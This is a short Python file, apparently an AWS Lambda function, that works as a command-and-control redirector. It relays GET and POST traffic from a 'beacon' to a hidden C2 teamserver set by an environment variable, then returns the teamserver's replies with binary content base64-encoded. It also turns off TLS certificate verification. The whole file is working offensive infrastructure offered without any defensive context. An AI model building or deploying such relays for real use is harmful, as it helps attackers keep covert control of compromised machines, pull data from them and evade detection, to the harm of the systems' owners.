import base64
import os
import requests


def redirector(event, context):

    print(event)

    #######
    # Forward HTTP request to C2
    #######

    # Setup forwarding URL
    teamserver = os.getenv("TEAMSERVER")
    url = "https://" + teamserver + event["requestContext"]["http"]["path"]

    # Parse Query String Parameters
    queryStrings = {}
    if "queryStringParameters" in event.keys():
        for key, value in event["queryStringParameters"].items():
            queryStrings[key] = value

    # Parse HTTP headers
    inboundHeaders = {}
    for key, value in event["headers"].items():
        inboundHeaders[key] = value

    # Handle potential base64 encodng of body
    body = ""
    if "body" in event.keys():
        if event["isBase64Encoded"]:
            body = base64.b64decode(event["body"])
        else:
            body = event["body"]

    # Forward request to C2
    requests.packages.urllib3.disable_warnings() 
    
    if event["requestContext"]["http"]["method"] == "GET":
        resp = requests.get(url, headers=inboundHeaders, params=queryStrings, verify=False)
    elif event["requestContext"]["http"]["method"] == "POST":
        resp = requests.post(url, headers=inboundHeaders, params=queryStrings, data=body, verify=False)
    else:
        return "ERROR: INVALID REQUEST METHOD! Must be POST or GET"

    ########
    # Return response to beacon
    ########

    # Parse outbound HTTP headers
    outboundHeaders = {}
    
    for head, val in resp.headers.items():
        outboundHeaders[head] = val

    # build response to beacon
    response = {
        "statusCode": resp.status_code
    }
    
    # check to see if response is utf8 decodable, otherwise we will assume binary and encode it, gateway decodes on receipt
    try:
        response['body'] = resp.content.decode('utf8')
        outboundHeaders['X-EncodedResponse'] = 'False'
        response['isBase64Encoded'] = False
    except:
        response['body'] = base64.b64encode(resp.content).decode('utf8')
        outboundHeaders['X-EncodedResponse'] = 'True'
        response['isBase64Encoded'] = True
        
    response['headers'] = outboundHeaders

    return response